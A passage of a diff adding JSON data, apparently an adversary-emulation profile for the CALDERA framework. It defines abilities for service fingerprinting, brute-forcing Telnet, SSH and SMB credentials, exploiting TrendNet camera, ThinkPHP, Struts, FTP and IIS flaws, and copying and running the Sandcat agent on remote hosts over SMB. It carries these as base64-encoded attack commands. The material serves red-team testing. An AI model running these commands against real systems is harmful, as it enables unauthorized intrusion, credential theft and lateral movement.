+                    "payload": [
+                        {
+                            "ability": 45,
+                            "payload": "fingerprint.exe"
+                        }
+                    ],
+                    "adversary_map_id": 99
+                },
+                {
+                    "id": 19,
+                    "ability_id": "e126cf64-e958-4677-a0c4-c0420b3f3ad8",
+                    "tactic": "discovery",
+                    "technique_name": "Network Service Scanning",
+                    "technique_id": "T1046",
+                    "name": "Quick Fingerprint SMB",
+                    "test": "cHl0aG9uMyAuL2ZpbmdlcnByaW50LnB5IC1zICN7cmVtb3RlLmhvc3Quc29ja2V0fSAtYyBzbWI=",
+                    "description": "Use dropped fingerprinter to find popular services",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "darwin",
+                    "parser": [
+                        {
+                            "ability": 19,
+                            "name": "line",
+                            "property": "remote.service.smb",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 19,
+                            "payload": "fingerprint.py"
+                        }
+                    ],
+                    "adversary_map_id": 100
+                },
+                {
+                    "id": 20,
+                    "ability_id": "e126cf64-e958-4677-a0c4-c0420b3f3ad8",
+                    "tactic": "discovery",
+                    "technique_name": "Network Service Scanning",
+                    "technique_id": "T1046",
+                    "name": "Quick Fingerprint SMB",
+                    "test": "cHl0aG9uMyAuL2ZpbmdlcnByaW50LnB5IC1zICN7cmVtb3RlLmhvc3Quc29ja2V0fSAtYyBzbWI=",
+                    "description": "Use dropped fingerprinter to find popular services",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "linux",
+                    "parser": [
+                        {
+                            "ability": 20,
+                            "name": "line",
+                            "property": "remote.service.smb",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 20,
+                            "payload": "fingerprint.py"
+                        }
+                    ],
+                    "adversary_map_id": 100
+                },
+                {
+                    "id": 22,
+                    "ability_id": "e126cf64-e958-4677-a0c4-c0420b3f3ad8",
+                    "tactic": "discovery",
+                    "technique_name": "Network Service Scanning",
+                    "technique_id": "T1046",
+                    "name": "Quick Fingerprint SMB",
+                    "test": "QzpcVXNlcnNcUHVibGljXGZpbmdlcnByaW50LmV4ZSAtcyAje3JlbW90ZS5ob3N0LnNvY2tldH0gLWMgc21i",
+                    "description": "Use dropped fingerprinter to find popular services",
+                    "cleanup": "",
+                    "executor": "cmd",
+                    "platform": "windows",
+                    "parser": [
+                        {
+                            "ability": 22,
+                            "name": "line",
+                            "property": "remote.service.smb",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 22,
+                            "payload": "fingerprint.exe"
+                        }
+                    ],
+                    "adversary_map_id": 100
+                },
+                {
+                    "id": 21,
+                    "ability_id": "e126cf64-e958-4677-a0c4-c0420b3f3ad8",
+                    "tactic": "discovery",
+                    "technique_name": "Network Service Scanning",
+                    "technique_id": "T1046",
+                    "name": "Quick Fingerprint SMB",
+                    "test": "QzpcVXNlcnNcUHVibGljXGZpbmdlcnByaW50LmV4ZSAtcyAje3JlbW90ZS5ob3N0LnNvY2tldH0gLWMgc21i",
+                    "description": "Use dropped fingerprinter to find popular services",
+                    "cleanup": "",
+                    "executor": "psh",
+                    "platform": "windows",
+                    "parser": [
+                        {
+                            "ability": 21,
+                            "name": "line",
+                            "property": "remote.service.smb",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 21,
+                            "payload": "fingerprint.exe"
+                        }
+                    ],
+                    "adversary_map_id": 100
+                },
+                {
+                    "id": 8,
+                    "ability_id": "f6a1bedd-8396-4909-92fd-2c2e418d3e90",
+                    "tactic": "discovery",
+                    "technique_name": "Network Service Scanning",
+                    "technique_id": "T1046",
+                    "name": "Quick Fingerprint SSH",
+                    "test": "cHl0aG9uMyAuL2ZpbmdlcnByaW50LnB5IC1zICN7cmVtb3RlLmhvc3Quc29ja2V0fSAtYyBzc2g=",
+                    "description": "Use dropped fingerprinter to find popular services",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "darwin",
+                    "parser": [
+                        {
+                            "ability": 8,
+                            "name": "line",
+                            "property": "remote.service.ssh",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 8,
+                            "payload": "fingerprint.py"
+                        }
+                    ],
+                    "adversary_map_id": 101
+                },
+                {
+                    "id": 9,
+                    "ability_id": "f6a1bedd-8396-4909-92fd-2c2e418d3e90",
+                    "tactic": "discovery",
+                    "technique_name": "Network Service Scanning",
+                    "technique_id": "T1046",
+                    "name": "Quick Fingerprint SSH",
+                    "test": "cHl0aG9uMyAuL2ZpbmdlcnByaW50LnB5IC1zICN7cmVtb3RlLmhvc3Quc29ja2V0fSAtYyBzc2g=",
+                    "description": "Use dropped fingerprinter to find popular services",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "linux",
+                    "parser": [
+                        {
+                            "ability": 9,
+                            "name": "line",
+                            "property": "remote.service.ssh",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 9,
+                            "payload": "fingerprint.py"
+                        }
+                    ],
+                    "adversary_map_id": 101
+                },
+                {
+                    "id": 11,
+                    "ability_id": "f6a1bedd-8396-4909-92fd-2c2e418d3e90",
+                    "tactic": "discovery",
+                    "technique_name": "Network Service Scanning",
+                    "technique_id": "T1046",
+                    "name": "Quick Fingerprint SSH",
+                    "test": "QzpcVXNlcnNcUHVibGljXGZpbmdlcnByaW50LmV4ZSAtcyAje3JlbW90ZS5ob3N0LnNvY2tldH0gLWMgc3No",
+                    "description": "Use dropped fingerprinter to find popular services",
+                    "cleanup": "",
+                    "executor": "cmd",
+                    "platform": "windows",
+                    "parser": [
+                        {
+                            "ability": 11,
+                            "name": "line",
+                            "property": "remote.service.ssh",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 11,
+                            "payload": "fingerprint.exe"
+                        }
+                    ],
+                    "adversary_map_id": 101
+                },
+                {
+                    "id": 10,
+                    "ability_id": "f6a1bedd-8396-4909-92fd-2c2e418d3e90",
+                    "tactic": "discovery",
+                    "technique_name": "Network Service Scanning",
+                    "technique_id": "T1046",
+                    "name": "Quick Fingerprint SSH",
+                    "test": "QzpcVXNlcnNcUHVibGljXGZpbmdlcnByaW50LmV4ZSAtcyAje3JlbW90ZS5ob3N0LnNvY2tldH0gLWMgc3No",
+                    "description": "Use dropped fingerprinter to find popular services",
+                    "cleanup": "",
+                    "executor": "psh",
+                    "platform": "windows",
+                    "parser": [
+                        {
+                            "ability": 10,
+                            "name": "line",
+                            "property": "remote.service.ssh",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 10,
+                            "payload": "fingerprint.exe"
+                        }
+                    ],
+                    "adversary_map_id": 101
+                }
+            ],
+            "3": [
+                {
+                    "id": 115,
+                    "ability_id": "049260e4-f227-4da6-a655-5cfebf9b452e",
+                    "tactic": "credential-access",
+                    "technique_name": "Brute Force",
+                    "technique_id": "T1110",
+                    "name": "Brute Force Telnet",
+                    "test": "cHl0aG9uMyAuL2JydXRlRm9yY2UucHkgLS10YXJnZXQgI3tyZW1vdGUuc2VydmljZS50ZWxuZXR9",
+                    "description": "Use dropped file to brute force credentials",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "darwin",
+                    "parser": [
+                        {
+                            "ability": 115,
+                            "name": "line",
+                            "property": "remote.host.credentials",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 115,
+                            "payload": "bruteForce.py"
+                        }
+                    ],
+                    "adversary_map_id": 103
+                },
+                {
+                    "id": 116,
+                    "ability_id": "049260e4-f227-4da6-a655-5cfebf9b452e",
+                    "tactic": "credential-access",
+                    "technique_name": "Brute Force",
+                    "technique_id": "T1110",
+                    "name": "Brute Force Telnet",
+                    "test": "cHl0aG9uMyAuL2JydXRlRm9yY2UucHkgLS10YXJnZXQgI3tyZW1vdGUuc2VydmljZS50ZWxuZXR9",
+                    "description": "Use dropped file to brute force credentials",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "linux",
+                    "parser": [
+                        {
+                            "ability": 116,
+                            "name": "line",
+                            "property": "remote.host.credentials",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 116,
+                            "payload": "bruteForce.py"
+                        }
+                    ],
+                    "adversary_map_id": 103
+                },
+                {
+                    "id": 118,
+                    "ability_id": "049260e4-f227-4da6-a655-5cfebf9b452e",
+                    "tactic": "credential-access",
+                    "technique_name": "Brute Force",
+                    "technique_id": "T1110",
+                    "name": "Brute Force Telnet",
+                    "test": "QzpcVXNlcnNcUHVibGljXGJydXRlRm9yY2UuZXhlIC0tdGFyZ2V0ICN7cmVtb3RlLnNlcnZpY2UudGVsbmV0fQ==",
+                    "description": "Use dropped file to brute force credentials",
+                    "cleanup": "",
+                    "executor": "cmd",
+                    "platform": "windows",
+                    "parser": [
+                        {
+                            "ability": 118,
+                            "name": "line",
+                            "property": "remote.host.credentials",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 118,
+                            "payload": "bruteForce.exe"
+                        }
+                    ],
+                    "adversary_map_id": 103
+                },
+                {
+                    "id": 117,
+                    "ability_id": "049260e4-f227-4da6-a655-5cfebf9b452e",
+                    "tactic": "credential-access",
+                    "technique_name": "Brute Force",
+                    "technique_id": "T1110",
+                    "name": "Brute Force Telnet",
+                    "test": "QzpcVXNlcnNcUHVibGljXGJydXRlRm9yY2UuZXhlIC0tdGFyZ2V0ICN7cmVtb3RlLnNlcnZpY2UudGVsbmV0fQ==",
+                    "description": "Use dropped file to brute force credentials",
+                    "cleanup": "",
+                    "executor": "psh",
+                    "platform": "windows",
+                    "parser": [
+                        {
+                            "ability": 117,
+                            "name": "line",
+                            "property": "remote.host.credentials",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 117,
+                            "payload": "bruteForce.exe"
+                        }
+                    ],
+                    "adversary_map_id": 103
+                },
+                {
+                    "id": 221,
+                    "ability_id": "0f149071-3772-46a7-9d44-0391411e381a",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Exploitation of Remote Services",
+                    "technique_id": "T1210",
+                    "name": "Exploit TrendNet IP Camera",
+                    "test": "cHl0aG9uMyB0cmVuZG5ldC1leHBsb2l0LnB5IC0tdGFyZ2V0ICN7cmVtb3RlLnNlcnZpY2UudHJlbmRuZXR9",
+                    "description": "Takes advantage of an Authenticated RCE Vuln in the TrendNet TV-IP410W Camera",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "darwin",
+                    "parser": [
+                        {
+                            "ability": 221,
+                            "name": "line",
+                            "property": "remote.vuln.trendnet_user",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 221,
+                            "payload": "trendnet-exploit.py"
+                        }
+                    ],
+                    "adversary_map_id": 104
+                },
+                {
+                    "id": 220,
+                    "ability_id": "0f149071-3772-46a7-9d44-0391411e381a",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Exploitation of Remote Services",
+                    "technique_id": "T1210",
+                    "name": "Exploit TrendNet IP Camera",
+                    "test": "cHl0aG9uMyB0cmVuZG5ldC1leHBsb2l0LnB5IC0tdGFyZ2V0ICN7cmVtb3RlLnNlcnZpY2UudHJlbmRuZXR9",
+                    "description": "Takes advantage of an Authenticated RCE Vuln in the TrendNet TV-IP410W Camera",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "linux",
+                    "parser": [
+                        {
+                            "ability": 220,
+                            "name": "line",
+                            "property": "remote.vuln.trendnet_user",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 220,
+                            "payload": "trendnet-exploit.py"
+                        }
+                    ],
+                    "adversary_map_id": 104
+                },
+                {
+                    "id": 223,
+                    "ability_id": "0f149071-3772-46a7-9d44-0391411e381a",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Exploitation of Remote Services",
+                    "technique_id": "T1210",
+                    "name": "Exploit TrendNet IP Camera",
+                    "test": "cHl0aG9uMyB0cmVuZG5ldC1leHBsb2l0LnB5IC0tdGFyZ2V0ICN7cmVtb3RlLnNlcnZpY2UudHJlbmRuZXR9",
+                    "description": "Takes advantage of an Authenticated RCE Vuln in the TrendNet TV-IP410W Camera",
+                    "cleanup": "",
+                    "executor": "cmd",
+                    "platform": "windows",
+                    "parser": [
+                        {
+                            "ability": 223,
+                            "name": "line",
+                            "property": "remote.vuln.trendnet_user",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 223,
+                            "payload": "trendnet-exploit.py"
+                        }
+                    ],
+                    "adversary_map_id": 104
+                },
+                {
+                    "id": 222,
+                    "ability_id": "0f149071-3772-46a7-9d44-0391411e381a",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Exploitation of Remote Services",
+                    "technique_id": "T1210",
+                    "name": "Exploit TrendNet IP Camera",
+                    "test": "cHl0aG9uMyB0cmVuZG5ldC1leHBsb2l0LnB5IC0tdGFyZ2V0ICN7cmVtb3RlLnNlcnZpY2UudHJlbmRuZXR9",
+                    "description": "Takes advantage of an Authenticated RCE Vuln in the TrendNet TV-IP410W Camera",
+                    "cleanup": "",
+                    "executor": "psh",
+                    "platform": "windows",
+                    "parser": [
+                        {
+                            "ability": 222,
+                            "name": "line",
+                            "property": "remote.vuln.trendnet_user",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 222,
+                            "payload": "trendnet-exploit.py"
+                        }
+                    ],
+                    "adversary_map_id": 104
+                },
+                {
+                    "id": 234,
+                    "ability_id": "1315ea39-be5e-4a21-9dac-ac54b1a7cd25",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Exploitation of Remote Services",
+                    "technique_id": "T1210",
+                    "name": "Exploit FTP With Metasploit",
+                    "test": "cHl0aG9uMyBtZXRhc3Bsb2l0X2V4cGxvaXRfcG9ydC5weSAtLXRhcmdldCAje3JlbW90ZS5zZXJ2aWNlLmZ0cH0gLS1zZXJ2ZXIgI3tzZXJ2ZXJ9",
+                    "description": "Use Metasploit to Exploit an FTP Server",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "linux",
+                    "parser": [
+                        {
+                            "ability": 234,
+                            "name": "line",
+                            "property": "remote.vuln.metasploit",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 234,
+                            "payload": "metasploit_exploit_port.py"
+                        }
+                    ],
+                    "adversary_map_id": 112
+                },
+                {
+                    "id": 121,
+                    "ability_id": "22964b17-efad-44fb-808e-d690f1a1c8f4",
+                    "tactic": "credential-access",
+                    "technique_name": "Brute Force",
+                    "technique_id": "T1110",
+                    "name": "Brute Force SSH",
+                    "test": "cHl0aG9uMyAuL2JydXRlRm9yY2UucHkgLS10YXJnZXQgI3tyZW1vdGUuc2VydmljZS5zc2h9",
+                    "description": "Use dropped file to brute force credentials",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "darwin",
+                    "parser": [
+                        {
+                            "ability": 121,
+                            "name": "line",
+                            "property": "remote.host.credentials",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 121,
+                            "payload": "bruteForce.py"
+                        }
+                    ],
+                    "adversary_map_id": 105
+                },
+                {
+                    "id": 122,
+                    "ability_id": "22964b17-efad-44fb-808e-d690f1a1c8f4",
+                    "tactic": "credential-access",
+                    "technique_name": "Brute Force",
+                    "technique_id": "T1110",
+                    "name": "Brute Force SSH",
+                    "test": "cHl0aG9uMyAuL2JydXRlRm9yY2UucHkgLS10YXJnZXQgI3tyZW1vdGUuc2VydmljZS5zc2h9",
+                    "description": "Use dropped file to brute force credentials",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "linux",
+                    "parser": [
+                        {
+                            "ability": 122,
+                            "name": "line",
+                            "property": "remote.host.credentials",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 122,
+                            "payload": "bruteForce.py"
+                        }
+                    ],
+                    "adversary_map_id": 105
+                },
+                {
+                    "id": 124,
+                    "ability_id": "22964b17-efad-44fb-808e-d690f1a1c8f4",
+                    "tactic": "credential-access",
+                    "technique_name": "Brute Force",
+                    "technique_id": "T1110",
+                    "name": "Brute Force SSH",
+                    "test": "QzpcVXNlcnNcUHVibGljXGJydXRlRm9yY2UuZXhlIC0tdGFyZ2V0ICN7cmVtb3RlLnNlcnZpY2Uuc3NofQ==",
+                    "description": "Use dropped file to brute force credentials",
+                    "cleanup": "",
+                    "executor": "cmd",
+                    "platform": "windows",
+                    "parser": [
+                        {
+                            "ability": 124,
+                            "name": "line",
+                            "property": "remote.host.credentials",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 124,
+                            "payload": "bruteForce.exe"
+                        }
+                    ],
+                    "adversary_map_id": 105
+                },
+                {
+                    "id": 123,
+                    "ability_id": "22964b17-efad-44fb-808e-d690f1a1c8f4",
+                    "tactic": "credential-access",
+                    "technique_name": "Brute Force",
+                    "technique_id": "T1110",
+                    "name": "Brute Force SSH",
+                    "test": "QzpcVXNlcnNcUHVibGljXGJydXRlRm9yY2UuZXhlIC0tdGFyZ2V0ICN7cmVtb3RlLnNlcnZpY2Uuc3NofQ==",
+                    "description": "Use dropped file to brute force credentials",
+                    "cleanup": "",
+                    "executor": "psh",
+                    "platform": "windows",
+                    "parser": [
+                        {
+                            "ability": 123,
+                            "name": "line",
+                            "property": "remote.host.credentials",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 123,
+                            "payload": "bruteForce.exe"
+                        }
+                    ],
+                    "adversary_map_id": 105
+                },
+                {
+                    "id": 105,
+                    "ability_id": "405d7d46-cdb9-4c7f-97e9-7feba3bea2f6",
+                    "tactic": "credential-access",
+                    "technique_name": "Brute Force",
+                    "technique_id": "T1110",
+                    "name": "Brute Force SMB",
+                    "test": "cHl0aG9uMyAuL2JydXRlRm9yY2UucHkgLS10YXJnZXQgI3tyZW1vdGUuc2VydmljZS5zbWJ9",
+                    "description": "Use dropped file to brute force credentials",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "darwin",
+                    "parser": [
+                        {
+                            "ability": 105,
+                            "name": "line",
+                            "property": "remote.host.credentials",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 105,
+                            "payload": "bruteForce.py"
+                        }
+                    ],
+                    "adversary_map_id": 106
+                },
+                {
+                    "id": 106,
+                    "ability_id": "405d7d46-cdb9-4c7f-97e9-7feba3bea2f6",
+                    "tactic": "credential-access",
+                    "technique_name": "Brute Force",
+                    "technique_id": "T1110",
+                    "name": "Brute Force SMB",
+                    "test": "cHl0aG9uMyAuL2JydXRlRm9yY2UucHkgLS10YXJnZXQgI3tyZW1vdGUuc2VydmljZS5zbWJ9",
+                    "description": "Use dropped file to brute force credentials",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "linux",
+                    "parser": [
+                        {
+                            "ability": 106,
+                            "name": "line",
+                            "property": "remote.host.credentials",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 106,
+                            "payload": "bruteForce.py"
+                        }
+                    ],
+                    "adversary_map_id": 106
+                },
+                {
+                    "id": 108,
+                    "ability_id": "405d7d46-cdb9-4c7f-97e9-7feba3bea2f6",
+                    "tactic": "credential-access",
+                    "technique_name": "Brute Force",
+                    "technique_id": "T1110",
+                    "name": "Brute Force SMB",
+                    "test": "QzpcVXNlcnNcUHVibGljXGJydXRlRm9yY2UuZXhlIC0tdGFyZ2V0ICN7cmVtb3RlLnNlcnZpY2Uuc21ifQ==",
+                    "description": "Use dropped file to brute force credentials",
+                    "cleanup": "",
+                    "executor": "cmd",
+                    "platform": "windows",
+                    "parser": [
+                        {
+                            "ability": 108,
+                            "name": "line",
+                            "property": "remote.host.credentials",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 108,
+                            "payload": "bruteForce.exe"
+                        }
+                    ],
+                    "adversary_map_id": 106
+                },
+                {
+                    "id": 107,
+                    "ability_id": "405d7d46-cdb9-4c7f-97e9-7feba3bea2f6",
+                    "tactic": "credential-access",
+                    "technique_name": "Brute Force",
+                    "technique_id": "T1110",
+                    "name": "Brute Force SMB",
+                    "test": "QzpcVXNlcnNcUHVibGljXGJydXRlRm9yY2UuZXhlIC0tdGFyZ2V0ICN7cmVtb3RlLnNlcnZpY2Uuc21ifQ==",
+                    "description": "Use dropped file to brute force credentials",
+                    "cleanup": "",
+                    "executor": "psh",
+                    "platform": "windows",
+                    "parser": [
+                        {
+                            "ability": 107,
+                            "name": "line",
+                            "property": "remote.host.credentials",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 107,
+                            "payload": "bruteForce.exe"
+                        }
+                    ],
+                    "adversary_map_id": 106
+                },
+                {
+                    "id": 198,
+                    "ability_id": "4c3d38aa-10bc-4d3e-84cd-021308d0793b",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Exploitation of Remote Services",
+                    "technique_id": "T1210",
+                    "name": "Exploit SMB With Metasploit",
+                    "test": "cHl0aG9uMyBtZXRhc3Bsb2l0X2V4cGxvaXRfcG9ydC5weSAtLXRhcmdldCAje3JlbW90ZS5zZXJ2aWNlLnNtYn0gLS1zZXJ2ZXIgI3tzZXJ2ZXJ9",
+                    "description": "Use Metasploit to Exploit SMB",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "linux",
+                    "parser": [
+                        {
+                            "ability": 198,
+                            "name": "line",
+                            "property": "remote.vuln.metasploit",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 198,
+                            "payload": "metasploit_exploit_port.py"
+                        }
+                    ],
+                    "adversary_map_id": 107
+                },
+                {
+                    "id": 199,
+                    "ability_id": "88c8beaf-da10-489e-896f-49fb583a1a0c",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Exploitation of Remote Services",
+                    "technique_id": "T1210",
+                    "name": "Exploit Apache Struts With Metasploit",
+                    "test": "cHl0aG9uMyBtZXRhc3Bsb2l0X2V4cGxvaXRfcG9ydC5weSAtLXRhcmdldCAje3JlbW90ZS5zZXJ2aWNlLmFwYWNoZXN0cnV0c30gLS1zZXJ2ZXIgI3tzZXJ2ZXJ9IC0ta2V5d29yZHMgc3RydXRz",
+                    "description": "Use Metasploit to Exploit an Apache Struts Website",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "linux",
+                    "parser": [
+                        {
+                            "ability": 199,
+                            "name": "line",
+                            "property": "remote.vuln.metasploit",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 199,
+                            "payload": "metasploit_exploit_port.py"
+                        }
+                    ],
+                    "adversary_map_id": 108
+                },
+                {
+                    "id": 201,
+                    "ability_id": "a5e34950-0687-4dae-b090-4a835e01c68d",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Exploitation of Remote Services",
+                    "technique_id": "T1210",
+                    "name": "Exploit ThinkPHP",
+                    "test": "cHl0aG9uMyB0aGlua3BocC1leHBsb2l0LnB5IC1pICN7cmVtb3RlLnNlcnZpY2UudGhpbmtwaHB9IC1zICN7c2VydmVyfQ==",
+                    "description": "Takes advantage of an RCE Vuln in ThinkPHP to run Sandcat on a remote server",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "darwin",
+                    "parser": [
+                        {
+                            "ability": 201,
+                            "name": "line",
+                            "property": "remote.vuln.thinkphp_user",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 201,
+                            "payload": "thinkphp-exploit.py"
+                        }
+                    ],
+                    "adversary_map_id": 109
+                },
+                {
+                    "id": 200,
+                    "ability_id": "a5e34950-0687-4dae-b090-4a835e01c68d",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Exploitation of Remote Services",
+                    "technique_id": "T1210",
+                    "name": "Exploit ThinkPHP",
+                    "test": "cHl0aG9uMyB0aGlua3BocC1leHBsb2l0LnB5IC1pICN7cmVtb3RlLnNlcnZpY2UudGhpbmtwaHB9IC1zICN7c2VydmVyfQ==",
+                    "description": "Takes advantage of an RCE Vuln in ThinkPHP to run Sandcat on a remote server",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "linux",
+                    "parser": [
+                        {
+                            "ability": 200,
+                            "name": "line",
+                            "property": "remote.vuln.thinkphp_user",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 200,
+                            "payload": "thinkphp-exploit.py"
+                        }
+                    ],
+                    "adversary_map_id": 109
+                },
+                {
+                    "id": 203,
+                    "ability_id": "a5e34950-0687-4dae-b090-4a835e01c68d",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Exploitation of Remote Services",
+                    "technique_id": "T1210",
+                    "name": "Exploit ThinkPHP",
+                    "test": "cHl0aG9uMyB0aGlua3BocC1leHBsb2l0LnB5IC1pICN7cmVtb3RlLnNlcnZpY2UudGhpbmtwaHB9IC1zICN7c2VydmVyfQ==",
+                    "description": "Takes advantage of an RCE Vuln in ThinkPHP to run Sandcat on a remote server",
+                    "cleanup": "",
+                    "executor": "cmd",
+                    "platform": "windows",
+                    "parser": [
+                        {
+                            "ability": 203,
+                            "name": "line",
+                            "property": "remote.vuln.thinkphp_user",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 203,
+                            "payload": "thinkphp-exploit.py"
+                        }
+                    ],
+                    "adversary_map_id": 109
+                },
+                {
+                    "id": 202,
+                    "ability_id": "a5e34950-0687-4dae-b090-4a835e01c68d",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Exploitation of Remote Services",
+                    "technique_id": "T1210",
+                    "name": "Exploit ThinkPHP",
+                    "test": "cHl0aG9uMyB0aGlua3BocC1leHBsb2l0LnB5IC1pICN7cmVtb3RlLnNlcnZpY2UudGhpbmtwaHB9IC1zICN7c2VydmVyfQ==",
+                    "description": "Takes advantage of an RCE Vuln in ThinkPHP to run Sandcat on a remote server",
+                    "cleanup": "",
+                    "executor": "psh",
+                    "platform": "windows",
+                    "parser": [
+                        {
+                            "ability": 202,
+                            "name": "line",
+                            "property": "remote.vuln.thinkphp_user",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 202,
+                            "payload": "thinkphp-exploit.py"
+                        }
+                    ],
+                    "adversary_map_id": 109
+                },
+                {
+                    "id": 193,
+                    "ability_id": "b4e1f059-7408-44d5-8c38-74acc95463e5",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Exploitation of Remote Services",
+                    "technique_id": "T1210",
+                    "name": "Exploit Apache Struts",
+                    "test": "cHl0aG9uMyBzdHJ1dHMtZXhwbG9pdC5weSAje3JlbW90ZS5zZXJ2aWNlLmFwYWNoZXN0cnV0c30gI3tzZXJ2ZXJ9",
+                    "description": "Takes advantage of an RCE Vuln in Apache Struts to run Sandcat on a remote server",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "linux",
+                    "parser": [
+                        {
+                            "ability": 193,
+                            "name": "line",
+                            "property": "remote.vuln.apachestruts_user",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 193,
+                            "payload": "struts-exploit.py"
+                        }
+                    ],
+                    "adversary_map_id": 110
+                },
+                {
+                    "id": 232,
+                    "ability_id": "bc77ffeb-74f3-486f-8a9e-2af50493b4fd",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Exploitation of Remote Services",
+                    "technique_id": "T1210",
+                    "name": "Exploit IIS With Metasploit",
+                    "test": "cHl0aG9uMyBtZXRhc3Bsb2l0X2V4cGxvaXRfcG9ydC5weSAtLXRhcmdldCAje3JlbW90ZS5zZXJ2aWNlLmlpc30gLS1zZXJ2ZXIgI3tzZXJ2ZXJ9IC0ta2V5d29yZHMgaWlz",
+                    "description": "Use Metasploit to Exploit an IIS Server",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "linux",
+                    "parser": [
+                        {
+                            "ability": 232,
+                            "name": "line",
+                            "property": "remote.vuln.metasploit",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 232,
+                            "payload": "metasploit_exploit_port.py"
+                        }
+                    ],
+                    "adversary_map_id": 111
+                }
+            ],
+            "4": [
+                {
+                    "id": 195,
+                    "ability_id": "a1a12e72-80be-47dc-86c3-7dbe6745259c",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Remote File Copy",
+                    "technique_id": "T1105",
+                    "name": "Execute Sandcat on remote host (SMB)",
+                    "test": "cHl0aG9uMyAuL3NtYkV4ZWMucHkgLS10YXJnZXQgI3tyZW1vdGUuc2VydmljZS5zbWJ9IC0tY3JlZCAje3JlbW90ZS5ob3N0LmNyZWRlbnRpYWxzfSAtLXNlcnZlciAje3NlcnZlcn0=",
+                    "description": "Copy & execute 54ndc47 to remote host (SMB)",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "darwin",
+                    "parser": [],
+                    "payload": [
+                        {
+                            "ability": 195,
+                            "payload": "smbExec.py"
+                        }
+                    ],
+                    "adversary_map_id": 113
+                },
+                {
+                    "id": 194,
+                    "ability_id": "a1a12e72-80be-47dc-86c3-7dbe6745259c",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Remote File Copy",
+                    "technique_id": "T1105",
+                    "name": "Execute Sandcat on remote host (SMB)",
+                    "test": "cHl0aG9uMyAuL3NtYkV4ZWMucHkgLS10YXJnZXQgI3tyZW1vdGUuc2VydmljZS5zbWJ9IC0tY3JlZCAje3JlbW90ZS5ob3N0LmNyZWRlbnRpYWxzfSAtLXNlcnZlciAje3NlcnZlcn0=",
